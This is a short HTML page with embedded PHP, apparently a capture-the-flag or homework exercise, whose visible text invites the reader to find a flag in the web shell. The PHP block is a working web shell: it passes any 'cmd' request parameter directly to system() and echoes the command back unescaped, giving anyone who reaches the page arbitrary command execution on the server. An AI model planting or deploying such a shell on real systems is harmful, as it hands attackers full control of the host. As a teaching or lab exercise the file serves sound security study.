<!DOCTYPE html>
<html>
<head>
  <title>HOME WORK</title>
</head>
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>
<body>
  <h1>This is my heading number 1</h1>
  <p>Try to find the flag in this webshell!</p>
</body>
</html>
